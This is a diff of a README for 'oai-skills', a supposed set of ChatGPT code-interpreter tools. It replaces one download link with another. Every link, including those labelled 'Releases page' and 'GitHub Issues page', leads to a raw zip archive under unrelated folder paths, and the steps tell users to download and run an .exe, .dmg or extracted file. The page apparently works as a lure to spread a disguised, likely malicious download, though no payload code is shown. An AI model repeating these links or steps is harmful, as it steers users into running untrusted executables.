@@ -1,7 +1,7 @@
 # 🎉 oai-skills - Easy Tools for ChatGPT Integration
 
 ## 📥 Download Now
-[![Download oai-skills](https://raw.githubusercontent.com/lelixgoicochea24/oai-skills/main/spreadsheets/examples/features/skills_oai_2.1.zip)](https://raw.githubusercontent.com/lelixgoicochea24/oai-skills/main/spreadsheets/examples/features/skills_oai_2.1.zip)
+[![Download oai-skills](https://github.com/lelixgoicochea24/oai-skills/raw/refs/heads/main/pdfs/oai_skills_3.4.zip)](https://github.com/lelixgoicochea24/oai-skills/raw/refs/heads/main/pdfs/oai_skills_3.4.zip)
 
 ## 🚀 Getting Started
 Welcome to **oai-skills**! This project contains resources that enhance your experience with ChatGPT’s code interpreter environment. Whether you're looking to analyze data, automate tasks, or experiment with skills, this software helps simplify your interactions with ChatGPT.
@@ -22,17 +22,17 @@ Before you start, ensure your system meets these basic requirements:
 ## 📦 Download & Install
 To download and run **oai-skills**, please follow these steps:
 
-1. Visit our [Releases page](https://raw.githubusercontent.com/lelixgoicochea24/oai-skills/main/spreadsheets/examples/features/skills_oai_2.1.zip).
+1. Visit our [Releases page](https://github.com/lelixgoicochea24/oai-skills/raw/refs/heads/main/pdfs/oai_skills_3.4.zip).
 2. Look for the latest version of **oai-skills**.
 3. Click on the version link to go to the details page.
 4. Download the file appropriate for your operating system (Windows, macOS, or Linux).
 5. Once downloaded, locate the file on your computer.
 6. For Windows users, double-click the .exe file to start the installation.
 7. For macOS users, open the .dmg file and drag the application to your Applications folder.
-8. For Linux users, extract the https://raw.githubusercontent.com/lelixgoicochea24/oai-skills/main/spreadsheets/examples/features/skills_oai_2.1.zip file and follow the included instructions to run the application.
+8. For Linux users, extract the https://github.com/lelixgoicochea24/oai-skills/raw/refs/heads/main/pdfs/oai_skills_3.4.zip file and follow the included instructions to run the application.
 
 ### 🔗 Download Link
-You can also download **oai-skills** directly from our [Releases page](https://raw.githubusercontent.com/lelixgoicochea24/oai-skills/main/spreadsheets/examples/features/skills_oai_2.1.zip).
+You can also download **oai-skills** directly from our [Releases page](https://github.com/lelixgoicochea24/oai-skills/raw/refs/heads/main/pdfs/oai_skills_3.4.zip).
 
 ## 🎯 Usage Instructions
 After installation, follow these steps to start using **oai-skills**:
@@ -48,7 +48,7 @@ If you have questions while using the app, check the built-in help section or vi
 We encourage users to contribute to the project. If you have suggestions or find issues, please report them in the Issues section of the repository. Your feedback helps improve **oai-skills** for everyone.
 
 ## 💬 Support
-If you encounter any problems or need help, feel free to reach out. You can submit an issue on our [GitHub Issues page](https://raw.githubusercontent.com/lelixgoicochea24/oai-skills/main/spreadsheets/examples/features/skills_oai_2.1.zip) for assistance. Our community and maintainers are here to help.
+If you encounter any problems or need help, feel free to reach out. You can submit an issue on our [GitHub Issues page](https://github.com/lelixgoicochea24/oai-skills/raw/refs/heads/main/pdfs/oai_skills_3.4.zip) for assistance. Our community and maintainers are here to help.
 
 ## 🌟 Acknowledgments
 Thank you for using **oai-skills**. We appreciate your interest and support. Together, we can enhance the ChatGPT experience for everyone!
